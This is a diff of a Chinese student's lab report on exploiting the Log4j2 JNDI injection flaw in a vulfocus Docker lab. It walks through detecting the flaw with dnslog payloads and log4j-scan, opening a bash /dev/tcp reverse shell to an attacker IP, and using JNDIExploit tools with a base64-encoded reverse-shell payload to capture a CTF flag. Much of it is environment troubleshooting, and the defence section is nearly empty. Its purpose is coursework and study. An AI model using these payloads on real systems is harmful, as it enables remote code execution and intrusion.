@@ -15,8 +15,11 @@ Ani
       - [漏洞介绍](#漏洞介绍)
       - [找到靶标的访问入口](#找到靶标的访问入口)
       - [检测漏洞存在性](#检测漏洞存在性)
-      - [验证漏洞可利用性](#验证漏洞可利用性)
-      - [漏洞利用效果](#漏洞利用效果)
+    - [验证漏洞可利用性](#验证漏洞可利用性)
+    - [漏洞利用效果](#漏洞利用效果)
+        - [使用 JNDIExploit 工具](#使用-jndiexploit-工具)
+    - [漏洞利用防御与加固](#漏洞利用防御与加固) 
+        - [漏洞利用防御与加固](#漏洞利用防御与加固)
 - [参考资料](#参考资料)
 
 ---
@@ -25,7 +28,6 @@ Ani
 
 - 作为红队完成对漏洞的存在性检验以及实现漏洞利用
 - 作为蓝队完成漏洞利用的缓解
-- 实现自动化脚本
 
 ### 实验目的
 
@@ -43,9 +45,21 @@ Ani
 
 ### 实验环境
 
+`Window 11`
+
+`MacOS 12.6.7`
+
 `VMware`
 
+`VirtualBox`
+
 `Kali 2023.2`
+
+`Todesk`
+
+`jadx`
+
+`Burpsuite`
 
 ### 实验过程
 
@@ -275,9 +289,27 @@ bash start.sh
 
 ![wangzhi](img/wangzhi.png)
 
+因为后面出了问题，重做的启动截图为：
+
+![qidong](img/qidong2.png)
+
+打开该网址，报错如下：
+
+![bug](img/bug4.png)
+
+配置端口转发：
+
+![duankou](img/duankou.png)
+
+回到网页刷新即可：
+
+![wangzhi](img/wangzhi1.png)
+
 点击 `？？？？` 有：
 
-![????]()
+![????](img/question.png)
+
+该截图为解决了问题后重新启动点击 `????` 的截图
 
 #### 检测漏洞存在性
 
@@ -304,13 +336,21 @@ docker exec -it adoring_bhabha bash
 ```bash
 sudo docker cp adoring_bhabha:/demo/demo.jar ./
 ```
-![](img/)
 
-在虚拟机中下载反编译软件 ``
+并在虚拟机中下载反编译软件 `jadx`
+
+[jadx 相关教程](https://blog.csdn.net/u014602228/article/details/122190940)
 
 用反编译软件打开 `jar` 文件，可以看到存在漏洞代码
 
 ![daima](img/daima.png)
+
+```bash
+  logger.error("{}", payload);
+  logger.info("{}", payload);
+  logger.info(payload);
+  logger.error(payload);
+```
 
 #### 验证漏洞可利用性
 
@@ -318,17 +358,227 @@ sudo docker cp adoring_bhabha:/demo/demo.jar ./
 
 ![yuming](img/yuming.png)
 
-这里得到的域名为 `suhj0q.dnslog.cn`
+这里得到的域名为 `bifd0d.dnslog.cn`
 
-构造 `payload` 为 `${jndi:ldap://suhj0q.dnslog.cn/ohhhh}`
+构造 `payload` 为 `${jndi:ldap://bifd0d.dnslog.cn/ohhhh}`
 
 ```bash
-curl -X POST http://192.168.254.128:50175/hello -d 'payload="${jndi:ldap://suhj0q.dnslog.cn/ohhhh}"'
+curl -X POST http://127.0.0.1:64748/hello -d 'payload="${jndi:ldap://bifd0d.dnslog.cn/ohhhh}"'
 ```
 
-自此，因为刷新了一下 `vulfocus` 页面，开始了无尽的 请联系管理员 报错
+显示报错：
+
+![bug](img/bug5.png)
+
+查询后得知大致是因为该版本不支持 `POST` 的发送
+
+然后查询过程中新建了虚拟机 `kali-attacker`，然后因为 `VMware` 没有双重加载的功能，然后我就将虚拟硬盘复制的副本作为这台新建的虚拟机的虚拟硬盘导入，然后就开始打不开第一台虚拟机。删去新建的虚拟机之后，原虚拟机可以重新打开，但是可能配置丢失，无法正常打开 `vulfocus` 界面了
+
+后面换成了 `VirtualBox` 重新做前面的环境配置，但是在 `vulfocus` 镜像管理页面无法正常同步，且一直显示 `服务器内部错误，请联系管理员` 的报错
+
+为了解决这个报错搞了好几天...
+
+最终使用的官方新版本的 `vulfocus` 环境搭建并且修改了容器内 `views.py` 才解决，但我自己的电脑这样也不能解决，所以后续的实验是通过 `Todesk` 远程控制另一台 `MacOS` 系统的电脑完成的
+
+后面重新做的时候，因为前面的报错改用 `Burpsuite` 手动发送请求
+
+使用 `Burpsuite` 需要生成 `CA` 证书，导入网页并对网页进行代理配置：
+
+![ca](img/cashengcheng.png)
+
+![shezhidaili](img/shezhidaili.png)
+
+使用 `Burpsuite` 进行抓包
+
+其中参考了 [Burpsuite 使用教程](https://blog.csdn.net/weixin_40586270/article/details/81431997#:~:text=%E4%B9%8B%E5%89%8D%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%9C%89%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8BBurpsuit%EF%BC%8C%E4%BB%8A%E5%A4%A9%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Burpsuite%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85%EF%BC%8C%E6%88%AA%E5%8C%85%EF%BC%8C%E6%94%B9%E5%8C%85%E3%80%82%20%E6%88%91%E8%BF%99%E9%87%8C%E6%98%AF%E5%9C%A8Kali%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%B5%8B%E8%AF%95%E7%9A%84%E3%80%82%20%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A,%E9%A6%96%E5%85%88%E8%AE%BE%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E4%BB%A3%E7%90%86%EF%BC%8C%E4%B9%8B%E5%89%8D%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%9C%89%E8%AE%B2%E5%88%B0%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E8%AE%B2%E4%BA%86%E3%80%82%20%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%20%E6%89%93%E5%BC%80Burpsuite%2C%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%2C%E4%BB%A3%E7%90%86ip%2C%E7%AB%AF%E5%8F%A3%E5%92%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%80%E8%87%B4%E3%80%82)
+
+![get](img/get.png)
+
+修改 `payload` 部分为新构造的替换字段 `${jndi:ldap://ktla3w.dnslog.cn}`，并选中 `右键 -- Convert selection -- URL --URL-encode all characters` 对新构造的字段进行编码
+
+![bianma](img/bianma.png)
+
+发送后刷新 `DNSLog.cn` 的结果可以看到有收到解析记录：
+
+![dns](img/dns.png)
+
+攻击者主机 `kali-attacker IP` 信息如下：
+
+![attackerip](img/attackerip.png)
+
+在 `attacker` 上下载 `log4j-scan`
+
+```bash
+git clone https://github.com/fullhunt/log4j-scan
+```
+
+![ls](img/ls.png)
+
+切换到 `log4j-scan` 目录安装相关配置
+
+```bash
+pip3 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
+```
+
+没有 `pip` 相关配置先下载
+
+```bash
+sudo apt update && sudo apt install -y python3-pip
+```
+
+安装好配置后需要编辑 `log4j-scan.py`
+
+```bash
+sudo vi log4j-scan.py
+```
+进入编辑模式后，在 `post_data_parameters` 列表中加入 `payload` 
+
+或者直接
+
+```bash
+sed -i.bak 's/password"/password", "payload"/' log4j-scan.py
+```
+
+然后执行
+
+```bash
+python3 log4j-scan.py --request-type post -u http://127.0.0.1:52666/hello --run-all-test
+```
+
+![python3](img/python3.png)
+
+得到报错
+
+```bash
+requests.exceptions.ConnectionError: HTTPSConnectionPool(host='interact.sh', port=443): Max retries exceeded with url: /register (Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x7f30a165c550>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution'))
+```
+
+查询得大致是网络连接的问题，但实际上能 `ping` 通，参考 [文章](https://blog.csdn.net/qq_39377418/article/details/102552822) 问题主要是： `http` 的连接数超过最大限制，默认的情况下连接是 `Keep-alive` 的，所以这就导致了服务器保持了太多连接而不能再新建连接，`ip` 被封或程序请求速度过快 
 
 #### 漏洞利用效果
+
+攻击者主机输入下列命令启动 `7777` 端口
+
+```bash
+nc -l -p 7777
+```
+
+受害者主机进到容器中输入构造反弹 `shell` 的 `payload`
+
+```bash
+bash -i >& /dev/tcp/192.168.56.3/7777 0>&1
+```
+
+![dockerps](img/dockerps.png)
+
+![bashfantan](img/bashfantan.png)
+
+回车后攻击者主机可以窥探受害者主机的信息
+
+![kuitan](img/kuitan.png)
+
+通过 `ls /tmp` 可以查看到 `flag`
+
+![flag](img/flag.png)
+
+`flag` 为`{bmh77cd8510-b156-4b57-acd0-55f780279fc0}`
+
+##### 使用 `JNDIExploit` 工具
+
+在攻击者主机输入下载命令
+
+```bash
+wget https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip
+```
+
+报错如下
+
+![bug](img/bug6.png)
+
+加了参数 `--no-check-cartificate` 报错 `403`，可能是资源不存在了
+
+根据提示信息直接去仓库下载，我这里需要翻墙，不然下不了
+
+下好之后拖进虚拟机，此时我的系统是 `MacOS` ，报错如下
+
+![tuozhuai](img/tuozhuai.png)
+
+新安装了 `Extension` 拓展包并打开系统隐私权限也无法拖拽，于是曲线救国使用 `ssh` 将文件远程传入虚拟机
+
+```bash
+scp 
+```
+
+![scp](img/scpzip.png)
+
+![ls1](img/ls1.png)
+
+解压并计算 `sha56` 加密值，对比老师的一致
+
+![unzip](img/unzip.png)
+
+攻击者主机监听受害者主机的 `1389` 和 `8080` 端口
+
+```bash
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.56.2
+```
+
+![jianting](img/jianting1.png)
+
+攻击者主机等待 `victim` 反弹回连 `getshell`，获取可用 `payload` 清单
+
+![-u](img/-u.png)
+
+受害者主机执行反弹
+
+```bash
+curl http://127.0.0.1:26925/hello -d 'payload=${jndi:ldap://192.168.56.3:1389/TomcatBypass/Command/Base64/'$(echo -n 'bash -i >& /dev/tcp/192.168.56.3/7777 0>&1' | base64 -w 0 | sed 's/+/%252B/g' | sed 's/=/%253d/g')'}'
+```
+
+![curl](img/curl.png)
+
+报错如下，请教同学知是因为 `curl` 不能发送 `post` 请求，于是尝试用他们的方法
+
+应用工具 `JNDI-Injection-Exploit` 搭建服务
+
+```bash
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “命令” -A “ip（攻击机）”
+```
+
+将构造的 `payload` 进行 `base64` 加密
+
+```
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjMvNzc3NyAwPiYx
+```
+
+执行 `JNDI-Injection-Exploit`
+
+![javain](img/javain.png)
+
+使用 `Burpsuite` 抓包并修改 `payload` 为获取到的
+
+```bash
+${jndi:rmi://192.168.56.3:1099/prj2oz}
+```
+![zhuabao](img/zhuabao.png)
+
+攻击者主机监听
+
+![jianting](img/jianting.png)
+
+但我这里也没有成功监听到
+
+最后将之前获得的 `flag` 提交
+
+![tongguo](img/tongguo.png)
+
+#### 漏洞利用缓解
+
+##### 漏洞利用防御与加固
+
+攻击原理和防御方式图
+
+![log4j2](img/log4j2attack.png)
 
 
 
@@ -346,9 +596,7 @@ curl -X POST http://192.168.254.128:50175/hello -d 'payload="${jndi:ldap://suhj0
 
 [log4j2 官网介绍](https://logging.apache.org/log4j/2.x/index.html)
 
-[Docker-docke 服务启动报错：Job for docker.service failed because the control process exited with error code.](https://blog.csdn.net/MinggeQingchun/article/details/123344229)
-
-[docker 启动报错：Failed to start Docker Application Container Engine](https://blog.csdn.net/u010918487/article/details/106925282)
+[bash_dev_tcp 介绍](https://becivells.github.io/2019/01/bash_i_dev_tcp/)
 
 ---
 
